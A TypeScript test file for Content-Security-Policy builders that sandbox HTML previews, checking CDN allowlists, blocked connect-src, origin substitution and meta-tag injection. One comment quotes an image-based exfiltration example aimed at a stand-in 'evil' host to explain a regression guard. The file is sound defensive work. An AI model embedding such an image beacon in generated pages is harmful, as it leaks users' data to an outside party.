import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  HTML_PREVIEW_CSP_ALLOWED_CDNS,
  buildCustomViewCsp,
  buildHtmlPreviewCsp,
  buildPrintCspContent,
  wrapHtmlWithPreviewCsp,
} from "../../../src/utils/html/previewCsp";

describe("buildHtmlPreviewCsp", () => {
  it("defaults to the exported CDN whitelist", () => {
    const csp = buildHtmlPreviewCsp();
    for (const cdn of HTML_PREVIEW_CSP_ALLOWED_CDNS) {
      assert.ok(csp.includes(cdn), `CSP should include ${cdn}`);
    }
  });

  it("denies everything by default (default-src 'none')", () => {
    const csp = buildHtmlPreviewCsp();
    assert.ok(csp.includes("default-src 'none'"));
  });

  it("allows inline scripts alongside the CDN whitelist", () => {
    const csp = buildHtmlPreviewCsp();
    assert.ok(csp.includes("script-src 'unsafe-inline' https://cdn.jsdelivr.net"));
  });

  it("blocks connect-src entirely (no phone-home)", () => {
    const csp = buildHtmlPreviewCsp();
    assert.ok(csp.includes("connect-src 'none'"));
  });

  it("allows images from self + CDN whitelist + data: and blob:", () => {
    const csp = buildHtmlPreviewCsp();
    assert.ok(
      csp.includes(
        "img-src 'self' https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.plot.ly data: blob:",
      ),
    );
  });

  it("includes cdn.plot.ly in the allowed CDNs (Plotly's first-party CDN — the LLM defaults to it)", () => {
    assert.ok(HTML_PREVIEW_CSP_ALLOWED_CDNS.includes("https://cdn.plot.ly"), "https://cdn.plot.ly must be allowed");
  });

  it("rejects the wildcard img-src policy to prevent image-based exfiltration", () => {
    const csp = buildHtmlPreviewCsp();
    // Explicit regression guard: `img-src *` would allow
    // `<img src="https://evil/?leak=...">` even with connect-src blocked.
    assert.ok(!/img-src \*/.test(csp));
  });

  it("accepts a custom CDN list", () => {
    const csp = buildHtmlPreviewCsp(undefined, ["https://example.com"]);
    assert.ok(csp.includes("script-src 'unsafe-inline' https://example.com"));
    assert.ok(!csp.includes("jsdelivr"));
  });

  it("substitutes the explicit origin for 'self' in img-src when provided", () => {
    // Required for Safari: the preview iframe is sandbox="allow-scripts"
    // only, so its document has an opaque origin and 'self' fails to
    // match same-origin /artifacts/images/... requests.
    const csp = buildHtmlPreviewCsp("http://localhost:5173");
    assert.ok(csp.includes("img-src http://localhost:5173 https://cdn.jsdelivr.net"));
    assert.ok(!csp.includes("img-src 'self'"));
  });
});

describe("buildCustomViewCsp", () => {
  it("locks connect-src to the origin but allows img-src from any https host", () => {
    // A custom view holds a scoped token + records, so fetch/XHR/WebSocket stay
    // origin-locked; img-src additionally allows `https:` so record-borne image
    // URLs (e.g. a feed's article thumbnails) render. See the threat-model note.
    const csp = buildCustomViewCsp("http://localhost:3001");
    assert.match(csp, /connect-src http:\/\/localhost:3001/);
    assert.ok(!/connect-src[^;]*https:/.test(csp), "connect-src must stay origin-locked, not widened to https:");
    assert.match(csp, /img-src http:\/\/localhost:3001 [^;]*data: blob: https:/);
    // Only `https:` is admitted as a scheme-source — never a bare `http:` token
    // (the `http://localhost` origin is a full URL, not the `http:` scheme).
    const imgSrc = csp.match(/img-src ([^;]*)/)?.[1] ?? "";
    assert.ok(!imgSrc.split(" ").includes("http:"), "img-src must not allow the insecure http: scheme");
  });

  it("keeps the wildcard out of img-src (https: scheme, not *)", () => {
    const csp = buildCustomViewCsp("http://localhost:3001");
    assert.ok(!/img-src[^;]*\*/.test(csp));
  });
});

describe("buildPrintCspContent", () => {
  it("substitutes origin for 'self' in img-src", () => {
    const csp = buildPrintCspContent("http://localhost:3001");
    assert.ok(csp.includes("img-src http://localhost:3001 https://cdn.jsdelivr.net"));
    // Make sure 'self' did NOT leak into the print policy.
    assert.ok(!csp.includes("img-src 'self'"));
  });

  it("keeps every other directive identical to the preview policy", () => {
    const print = buildPrintCspContent("http://localhost:3001");
    const preview = buildHtmlPreviewCsp();
    for (const directive of ["default-src 'none'", "script-src 'unsafe-inline'", "font-src", "connect-src 'none'"]) {
      assert.ok(print.includes(directive), `print CSP should include ${directive}`);
      assert.ok(preview.includes(directive), `preview CSP should include ${directive}`);
    }
  });

  it("accepts a custom CDN list", () => {
    const csp = buildPrintCspContent("http://localhost:5173", ["https://example.com"]);
    assert.ok(csp.includes("script-src 'unsafe-inline' https://example.com"));
    assert.ok(csp.includes("img-src http://localhost:5173 https://example.com"));
    assert.ok(!csp.includes("jsdelivr"));
  });
});

describe("wrapHtmlWithPreviewCsp", () => {
  it("injects the meta tag into an existing <head>", () => {
    const html = `<!DOCTYPE html><html><head><title>x</title></head><body>x</body></html>`;
    const out = wrapHtmlWithPreviewCsp(html);
    assert.ok(out.includes(`<head><meta http-equiv="Content-Security-Policy" content="default-src 'none'`));
    // Original <title> preserved right after the injected meta.
    assert.ok(out.includes(`"><title>x</title>`));
  });

  it("wraps a fragment in a synthetic full document when <head> is absent", () => {
    const out = wrapHtmlWithPreviewCsp("<p>just a fragment</p>");
    assert.ok(out.startsWith("<!DOCTYPE html><html><head>"));
    assert.ok(out.includes(`Content-Security-Policy`));
    assert.ok(out.includes("<body><p>just a fragment</p></body>"));
  });

  it("is case-insensitive against <HEAD>", () => {
    const html = `<!DOCTYPE html><html><HEAD></HEAD><body>x</body></html>`;
    const out = wrapHtmlWithPreviewCsp(html);
    assert.ok(out.includes(`<HEAD><meta http-equiv`));
  });
});
